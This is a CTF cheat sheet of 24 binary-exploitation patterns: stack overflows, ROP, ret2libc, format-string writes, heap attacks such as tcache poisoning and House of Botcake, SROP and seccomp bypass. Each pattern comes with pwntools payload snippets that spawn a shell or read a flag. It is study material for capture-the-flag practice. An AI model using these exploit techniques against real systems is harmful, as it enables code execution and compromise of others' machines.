---
title: pwn
type: note
permalink: ctf-vault/pwn
---

# Binary Exploitation (pwn) — CTF Pattern Vault

> Mined from real writeups, deduped, sorted by frequency (high→low, quick wins first). 24 patterns. Recognition-first: observe **signal** → run **tool/command**.

---

## checksec triage first
- category: pwn
- signal: Unknown pwn binary, no description; need to pick exploit class
- technique: Read mitigations (NX/PIE/Canary/RELRO) + arch + obvious win/strings. No canary->straight BOF/ROP; No PIE->static addrs/ret2dlresolve; Partial RELRO->GOT overwrite viable; PIE->must leak first
- tool/command: checksec --file=./chall; file ./chall; strings -a ./chall | grep -iE 'flag|/bin/sh|system|cat'; nm ./chall | grep -iE 'win|flag|shell'
- gotchas: Full RELRO blocks GOT overwrite (pivot to __free_hook/retaddr). 'No canary' in checksec doesn't prove no canary in the vuln function. PIE on => leak before any binary address
- frequency: high
- depth: quick
- sources: https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2libc, https://guyinatuxedo.github.io/index.html

## BOF offset via cyclic
- category: pwn
- signal: Input into fixed stack buffer (gets/read/scanf %s) crashes; RIP/RSP shows 0x6161... ascii; need exact distance to saved RIP
- technique: Send De Bruijn pattern, crash, read faulting value from RIP/RSP, map back to offset. Step 0 for ret2win/ret2libc/ROP
- tool/command: cyclic 300 | ./bin ; in pwndbg at crash: cyclic -l $rsp (or cyclic -l 0x6161616c); pwntools: offset=cyclic_find(0x6161616c)
- gotchas: On x64 RIP often not set (crash on ret) -> cyclic_find the RSP top qword instead. Use cyclic(n=8) reasoning for 64-bit. ASLR/PIE doesn't change the offset
- frequency: high
- depth: quick
- sources: https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc, https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/basic-rop/

## ret2win (overflow into win function)
- category: pwn
- signal: No PIE + no canary; gets/read into small stack buffer; unreferenced win()/flag()/give_shell() that cats flag or execs shell visible in nm/Ghidra
- technique: Find offset to saved RIP, overwrite with win addr. On x86_64 add a bare ret gadget before win to fix 16-byte stack alignment (movaps SIGSEGV inside system/printf)
- tool/command: off=cyclic_find(0x6161616c); ret=ROP(elf).find_gadget(['ret'])[0]; p.sendline(b'A'*off+p64(ret)+p64(elf.sym.win))
- gotchas: movaps SIGSEGV if RSP not 16-aligned -> insert single ret. Offset is to RIP not RBP (8B saved rbp between). PIE on => win addr randomized, needs leak. Win may need RDI set
- frequency: high
- depth: quick
- sources: https://chovid99.github.io/posts/cyber-apocalypse-2024-pwn/, https://guyinatuxedo.github.io/index.html

## pop rdi gadget for 64-bit args
- category: pwn
- signal: 64-bit ROP; must control RDI (1st arg) to call system/puts
- technique: pop rdi; ret loads RDI, then arg value, then target func. For rsi/rdx use pop rsi/pop rdx or ret2csu when no clean gadget
- tool/command: poprdi=ROP(elf).find_gadget(['pop rdi','ret'])[0]; payload=p64(poprdi)+p64(arg)+p64(elf.plt.system)
- gotchas: 32-bit passes args on the stack (no pop rdi needed). No pop rdi in binary -> search libc after leak or ret2csu. Watch 16-byte alignment before calls
- frequency: high
- depth: quick
- sources: https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc

## ret2libc via puts leak (2-stage ROP)
- category: pwn
- signal: BOF, NX on, dynamically linked, libc provided, no win; puts/printf in PLT; ASLR on (libc base unknown); program loops back to main/vuln
- technique: Stage1: ROP puts(puts@got) then return to main to leak libc addr; libc.address=leak-libc.sym.puts. Stage2: ROP system('/bin/sh') or one_gadget
- tool/command: rop=ROP(elf);rop.puts(elf.got.puts);rop.call(elf.sym.main);p.sendline(b'A'*off+rop.chain()); leak=u64(p.recvline().strip().ljust(8,b'\x00')); libc.address=leak-libc.sym.puts; rop2=ROP(libc);rop2.raw(rop2.ret);rop2.system(next(libc.search(b'/bin/sh')))
- gotchas: Add bare ret for 16-byte align before system. Must return to func that re-triggers read. Wrong libc -> pwninit/libc-database from low-3-nibbles. u64 needs ljust(8,b'\x00')
- frequency: high
- depth: quick
- sources: https://chovid99.github.io/posts/cyber-apocalypse-2024-pwn/, https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc

## one_gadget one-shot shell
- category: pwn
- signal: You have libc base + single write/call primitive (overwrite __free_hook/__malloc_hook/GOT/retaddr) but can't stage full ROP or set RDI
- technique: Run one_gadget on the exact libc for a constraint-satisfying execve('/bin/sh',0,0); write libc.address+offset into the controlled slot. Verify constraints hold at trigger
- tool/command: one_gadget ./libc.so.6 ; ogg=libc.address+0x4f432; write(__free_hook,p64(ogg))
- gotchas: Each gadget has constraints (e.g. [rsp+0x40]==NULL, rdx==NULL). Try multiple; many fail. If none fit, fall back to __free_hook=system + '/bin/sh' chunk. Wrong libc base is the usual 'fail'
- frequency: high
- depth: quick
- sources: https://github.com/nobodyisnobody/write-ups, https://lkmidas.github.io/posts/20210103-tetctf2021-writeups/

## Format string offset discovery + leak
- category: pwn
- signal: User input flows into printf(buf) with no format arg; %p echoes hex back; need offset + leak canary/libc/PIE
- technique: Send AAAAAAAA.%p.%p... count to where 0x4141414141414141 appears = your offset N. Then %N$p for raw stack leaks (canary=value ending 00), %N$s to deref a placed address
- tool/command: a=FmtStr(exec_fmt); off=a.offset ; manual: p.sendline(b'AAAAAAAA'+b'.%p'*20); leak via p.sendline(f'%{off}$p'.encode())
- gotchas: x64 first 5-6 'args' are registers before stack (stack starts ~offset 6). Pointers must go after format specifiers (null bytes truncate). Use 8-byte marker for x64 alignment. Canary LSB is 0x00 -> use %p not %s
- frequency: high
- depth: quick
- sources: https://ir0nstone.gitbook.io/notes/binexp/stack/format-string, https://ctf-wiki.mahaloz.re/pwn/linux/fmtstr/fmtstr_example/

## Format string write -> GOT overwrite (fmtstr_payload)
- category: pwn
- signal: Format string bug + need code exec; Partial/No RELRO (GOT writable); printf called again after write; libc/PLT addr known
- technique: Let pwntools build %n writes: overwrite a frequently-called GOT entry (printf/puts/exit) with system/one_gadget/win, or overwrite a return addr. Overwriting exit@got->main re-loops for multi-stage
- tool/command: payload=fmtstr_payload(off,{elf.got.printf:libc.sym.system}) then trigger printf('/bin/sh'); simple flip: fmtstr_payload(off,{elf.got.exit:elf.sym.win})
- gotchas: Full RELRO -> GOT read-only (target retaddr/__free_hook). Use {addr:value} dict so pwntools splits byte/short writes; large %n is huge/slow. Put pointers last (printf stops at NULL). Correct offset mandatory
- frequency: high
- depth: quick
- sources: https://blog.thecyberthesis.com/blog/writeups/picoCTF/pwn/format-string-3, https://docs.pwntools.com/en/stable/fmtstr.html

## Stack canary leak then BOF
- category: pwn
- signal: Canary found / 'stack smashing detected'; AND a format string %p or an overread that prints uninitialized/leaked bytes
- technique: Leak canary (8B ending 0x00 on x64) via %N$p or overread, preserve it at exact offset in the overflow (junk+canary+saved_rbp+ROP), then do BOF/ret2libc
- tool/command: canary=int(p.recvline(),16); payload=b'A'*off_to_canary+p64(canary)+b'B'*8+p64(retaddr)
- gotchas: Canary LSB=0x00 -> %s stops early, string read null-clobbers it. Offset to canary != to RIP (8B rbp between). Fork servers: brute byte-by-byte (256/byte) if no re-randomize
- frequency: high
- depth: quick
- sources: https://ir0nstone.gitbook.io/notes/binexp/stack/canaries, https://guyinatuxedo.github.io/14-ret_2_system/hxp18_poorCanary/

## PIE bypass: leak rebase / partial overwrite
- category: pwn
- signal: PIE enabled, addrs randomized; either can leak a code/stack pointer, or can overwrite low bytes of saved RIP (page offset fixed)
- technique: Leak any code addr, elf.address=leak-static_offset, then use symbols/ROP normally. No leak: overwrite low 1-2 bytes of retaddr to redirect within same/nearby page, brute the ~4 ASLR nibble bits (1/16)
- tool/command: elf.address=leak-elf.sym.some_func ; partial: payload=b'A'*off+p16(target&0xffff) (loop ~16x to brute nibble)
- gotchas: PIE base is page-aligned (ends 0x000); only low 12 bits fixed, bits 13-16 are entropy. Use read() not scanf %s so a null doesn't clobber extra bytes. Overwrite lowest bytes first
- frequency: high
- depth: quick
- sources: https://ir0nstone.gitbook.io/notes/binexp/stack/pie, https://chovid99.github.io/posts/cyber-apocalypse-2024-pwn/

## tcache poisoning -> __free_hook = system
- category: pwn
- signal: Heap menu (alloc/free/edit/view); UAF (freed ptr not nulled) or heap overflow lets you edit a freed chunk's fd; glibc 2.26-2.33; size <=0x408
- technique: Leak libc via unsorted bin first. Free chunk, edit fd to target (__free_hook). malloc x2 -> 2nd returns target; write system there; free a chunk holding '/bin/sh'
- tool/command: free(a); edit(a,p64(libc.sym.__free_hook)); malloc(sz); t=malloc(sz); edit(t,p64(libc.sym.system)); edit(bin,b'/bin/sh\x00'); free(bin)
- gotchas: glibc>=2.32 mangles fd (safe-linking, need heap leak). glibc>=2.34 removed __free_hook/__malloc_hook -> pivot FSOP/_IO/stdout. 2.29+ tcache key blocks naive double-free. Exact size class only
- frequency: high
- depth: deep
- sources: https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/tcache-bin-attack.html, https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/

## UAF libc leak via unsorted bin
- category: pwn
- signal: Can free a chunk and still read it (UAF/view-after-free); chunk >0x408 or tcache already filled
- technique: Get a freed chunk into unsorted bin (size>tcache max, or overflow tcache with 7-8 frees). Its fd/bk point into main_arena (libc). Read -> libc leak; subtract known main_arena offset
- tool/command: free(big); leak=u64(view(big)[:8]); libc.address=leak-(main_arena_off+0x60) # offset version-specific, find via gdb 'p &main_arena'
- gotchas: Small frees go to tcache not unsorted -> alloc >0x408 or free 8 first. Only first/last unsorted chunk holds arena ptr. main_arena offset is glibc-version specific. Reading tcache fd gives heap base (for safe-linking)
- frequency: high
- depth: deep
- sources: https://www.willsroot.io/2020/10/cuctf-2020-dr-xorisaurus-heap-writeup.html, https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/

## Use-after-free dangling ptr overwrite
- category: pwn
- signal: Menu uses an index/pointer after free (not NULLed); you can re-alloc same size to reclaim the slot, then a use reads/calls a field
- technique: Free obj (program keeps dangling ptr), re-malloc same size class with attacker data (tcache LIFO returns it), trigger stale use -> forged vtable/fptr/struct redirects execution or leaks
- tool/command: free(0); new=create(size_of_obj,p64(win_or_fptr)); use(0) # program reads your data
- gotchas: Must match exact size class (tcache LIFO). If ptr NULLed on free -> not exploitable. If object zeroed on free, rewrite all needed fields. PIE/ASLR -> leak first
- frequency: high
- depth: deep
- sources: https://picoctfsolutions.com/posts/heap-exploitation-ctf, https://github.com/nobodyisnobody/write-ups

## ret2syscall (static / no libc)
- category: pwn
- signal: Statically linked, NX on; ROPgadget finds pop rax/rdi/rsi/rdx + syscall/int 0x80; '/bin/sh' string or writable bss
- technique: Build execve('/bin/sh',0,0): rax=59(x64)/eax=11(x86), rdi/ebx=binsh ptr, rsi/rdx=0, then syscall/int 0x80. If no /bin/sh string, write it to bss first
- tool/command: ROPgadget --binary ./bin --only 'pop|ret'; ROPgadget --binary ./bin --string '/bin/sh'; chain=p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(59)+p64(syscall)
- gotchas: x86 int 0x80 eax=11; x64 syscall rax=59. pop rdx scarce -> ret2csu. No /bin/sh -> write to bss with a mov gadget
- frequency: med
- depth: quick
- sources: https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/basic-rop/

## Integer overflow / signed length bypass
- category: pwn
- signal: Length/index read as signed int, checked (if len<N) then used as size_t in read/memcpy/malloc; or count*size multiply
- technique: Pass negative value to slip past signed upper-bound; reinterpreted as unsigned size_t it's huge -> oversized copy/overflow. Or overflow a multiply to under-allocate
- tool/command: p.sendline(b'-1') # passes len<10 but read() treats as ~1.8e19
- gotchas: Some readers cap at real buffer regardless -> check actual use. Negative index also enables OOB. Multiply overflow needs product to wrap below the check
- frequency: med
- depth: quick
- sources: https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/

## ret2csu (control rdx/rsi, leakless)
- category: pwn
- signal: x86_64 ROP, no pop rdx/pop rsi gadget; need 3rd arg (rdx) for read/write; binary has __libc_csu_init (pre-glibc-2.34)
- technique: Two csu gadgets: g1 pops rbx,rbp,r12,r13,r14,r15; g2 mov rdx,r15;mov rsi,r14;mov edi,r13d;call [r12+rbx*8]. Set rbx=0,rbp=1 to pass cmp/jne loop; r12=GOT slot of target
- tool/command: rop=ROP(elf); rop.call(elf.sym.func,[a,b,c]) # pwntools auto-uses csu. Manual: p64(g1)+p64(0)+p64(1)+p64(call_got)+p64(edi)+p64(rsi)+p64(rdx)+p64(g2)
- gotchas: edi only gets low 32 bits (mov edi,r13d). call target is [r12+rbx*8] (ptr to func, not func). g2 re-enters with +8 rsp -> pad chain. glibc>=2.34 removed csu -> SROP/dlresolve
- frequency: med
- depth: deep
- sources: https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html, https://hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2csu.html

## ret2dlresolve (leakless, no PIE)
- category: pwn
- signal: No libc leak / unknown libc, NX on, No PIE, Partial/No RELRO; have BOF + writable area (.bss) + read() to stage, enough ROP space
- technique: Forge fake Elf_Sym/Elf_Rel/STRTAB in writable mem, call PLT0 dl-resolve stub with crafted reloc index so linker resolves system('/bin/sh'). pwntools automates struct layout
- tool/command: dl=Ret2dlresolvePayload(elf,symbol='system',args=['/bin/sh']); rop=ROP(elf); rop.read(0,dl.data_addr); rop.ret2dlresolve(dl); p.sendline(fit({off:rop.chain()})); p.sendline(dl.payload)
- gotchas: Full RELRO defeats it (no lazy binding). PIE complicates fixed data_addr. data_addr must be writable+reachable. 32-bit is the clean case; let pwntools handle 64-bit alignment
- frequency: med
- depth: deep
- sources: https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html, https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve

## SROP (sigreturn-oriented)
- category: pwn
- signal: Very limited gadgets (no pop rsi/rdx), but 'syscall; ret' exists and you can set rax=15; large input buffer (~300B); often static
- technique: Trigger rt_sigreturn (rax=15) to pop a full SigreturnFrame off the stack, setting ALL regs at once for execve('/bin/sh',0,0)
- tool/command: frame=SigreturnFrame(); frame.rax=0x3b; frame.rdi=binsh; frame.rsi=0; frame.rdx=0; frame.rip=syscall_gadget; payload=b'A'*off+p64(pop_rax)+p64(15)+p64(syscall)+bytes(frame)
- gotchas: Need rax=15 then syscall to invoke sigreturn. Frame ~248-300B -> big overflow. Write '/bin/sh' to bss first via read. frame.rsp/rip must stay valid
- frequency: med
- depth: deep
- sources: https://docs.pwntools.com/en/stable/rop/srop.html, https://book.jorianwoltjer.com/binary-exploitation/return-oriented-programming-rop/sigreturn-oriented-programming-srop

## seccomp ORW shellcode / ROP
- category: pwn
- signal: prctl/seccomp in imports or 'sandbox' wording; execve blocked; flag is a file; binary runs your shellcode (RWX/jmp rsp) or you can ROP
- technique: Dump filter; if open/openat/read/write allowed, ORW: open('/flag')->read->write(1). If shellcode disallowed (NX), ROP-to-ORW or setcontext pivot. x32 bypass: rax=0x40000000+nr
- tool/command: seccomp-tools dump ./chal; sc=shellcraft.open('/flag')+shellcraft.read(3,'rsp',100)+shellcraft.write(1,'rsp',100); p.send(asm(sc)) # or shellcraft.openat(-100,'/flag',0)
- gotchas: execve/execveat usually blocked - no system(). open(nr 2) may be blocked but openat(257) allowed. Filter may check arch (blocks x32). fd from open is often 3. Try /flag and ./flag
- frequency: med
- depth: deep
- sources: https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html, https://github.com/nobodyisnobody/write-ups

## fastbin dup / double-free
- category: pwn
- signal: Double-free allowed, chunk in fastbin range (<=0x80 x64); pre-tcache glibc (2.23) or tcache exhausted; malloc returns same chunk twice
- technique: free(a);free(b);free(a) puts a twice in fastbin; malloc x3 for a duplicate ptr; overwrite fd to near target where a fake size passes the fastbin size check (e.g. 0x7f for __malloc_hook-0x23)
- tool/command: free(a);free(b);free(a); p1=malloc(); edit(p1,p64(target-0x23)); malloc();malloc(); t=malloc(); write(t,p64(one_gadget))
- gotchas: glibc 2.23 blocks consecutive same-chunk free -> use a;b;a. Fake chunk size field must match requested size class. tcache (2.26+) intercepts -> fill tcache (7 frees) first
- frequency: med
- depth: deep
- sources: https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/, https://github.com/nobodyisnobody/write-ups

## safe-linking bypass (glibc >=2.32)
- category: pwn
- signal: Heap on glibc 2.32+; naive tcache/fastbin poison writes garbage / crashes in _int_malloc; freed fd looks like high-entropy random; you can leak a heap ptr
- technique: fd stored mangled as (chunk_addr>>12) ^ ptr. Leak any heap addr to recover page base, forge mangled fd so demangled = target
- tool/command: mangle=lambda pos,ptr:(pos>>12)^ptr ; write p64(mangle(chunk_addr,target)) into freed fd. Reverse leak: target=(heap_leak>>12)^leaked_fd
- gotchas: Need heap leak BEFORE forging. Poisoned target must be 0x10-aligned else malloc aborts. Shift is >>12 (page bits) not full addr. Forgetting to mangle = instant crash
- frequency: med
- depth: deep
- sources: https://www.willsroot.io/2020/10/cuctf-2020-dr-xorisaurus-heap-writeup.html, https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation

## Off-by-one / poison-null-byte heap overlap
- category: pwn
- signal: Heap write overflows by exactly 1 byte (often NULL) past buffer; classic strlen==N then strcpy copies N+1; you control adjacent chunk layout
- technique: Null byte clears next chunk's prev_inuse / shrinks size; forge prev_size so backward consolidation on free overlaps a live chunk -> arbitrary edit of its metadata/pointers, pivot to tcache poison
- tool/command: # groom sizes so off-by-one zeroes size low byte (0x110->0x100); forge prev_size; free to merge backward; verify in pwndbg 'heap'/'bins'
- gotchas: glibc>=2.28 added chunksize(p)!=prev_size sanity check, breaking naive poison-null. Needs precise grooming. Non-null off-by-one is easier. Highly layout-dependent
- frequency: med
- depth: deep
- sources: https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/off_by_one/, https://devel0pment.de/?p=688

## House of Botcake (2.29+ double-free overlap)
- category: pwn
- signal: glibc 2.29+ with tcache double-free key check; need chunk overlap or arbitrary alloc but naive double-free blocked
- technique: Fill tcache(7), free two consecutive chunks to consolidate in unsorted bin, malloc 1 (pull from tcache), free one again into tcache -> chunk in both tcache+unsorted = overlap + poisonable fd, bypassing key check
- tool/command: # alloc 9; free 7 into tcache; free A,B (consolidate); malloc 1; free B again (safe) -> edit fd for tcache poison. See how2heap house_of_botcake.c
- gotchas: The '7 fill' is mandatory. Consolidation needs adjacent non-tcache chunks + top barrier. Route through unsorted to evade tcache key
- frequency: med
- depth: deep
- sources: https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c, https://ret2school.github.io/post/catastrophe/

## struct callback-pointer overwrite (adjacent-chunk strcpy, no glibc internals)
- category: pwn
- signal: Source shows a struct with a function-pointer field (`void (*callback)()` / handler / fp) AND a `char *name`/buffer; two+ of these malloc'd back-to-back; an unbounded `strcpy`/`gets`/`memcpy` into one struct's buffer; later `if (s->callback) s->callback();`. A `winner()`/`win()`/`print_flag()` reads flag.txt. No-PIE. (NOT a return-address smash — the "overflow saved return address" in the prompt is a red herring; the real target is the adjacent heap struct.)
- technique: Overflow out of struct1's name buffer through the heap into struct2, overwriting struct2->callback with winner(). If a SECOND copy writes through struct2->name (e.g. `strcpy(i2->name, argv[2])`), you must also set struct2->name to a valid writable addr (.bss) so that copy doesn't segfault before the callback fires. Pad to the callback field, place winner there.
- tool/command: `templates/pwn/triage.sh ./bin` → gives winner + writable .bss in one call. payload = b'A'*PAD + p32(0x41414141) + p32(BSS) + p32(WINNER)  # [filler nonnull][name->bss][callback->winner]. arg-based remote: send "name1 name2"; finish with get_flag(io) (templates/pwn/exploit.py)
- gotchas: (1) the second strcpy uses the OVERWRITTEN name ptr — point it at a writable no-null addr (.bss) or you SIGSEGV before the callback. (2) strcpy stops at \x00 → every field in the payload must be null-free (use 0x41414141, not p32(1)). (3) 32-bit malloc(8) → 16-byte chunk, user data at chunk+8; find PAD empirically (here 16 filler→priority, then name@20, callback@24). (4) local test: `process([exe, payload, b'B'])` with RAW bytes — NOT subprocess+`.decode('latin-1')` (mangles bytes → misleading SIGSEGV). flag.txt must exist locally to see the flag. (5) recognition saves ~7min of re-derivation — this is the play, don't fuzz offsets blind.
- frequency: med (common in intro-heap / picoCTF-style)
- depth: medium (pure struct layout + null-byte care, no allocator internals)
- sources: picoCTF Heap Havoc (test/pwn/1); generalizes to any struct-with-callback + unbounded copy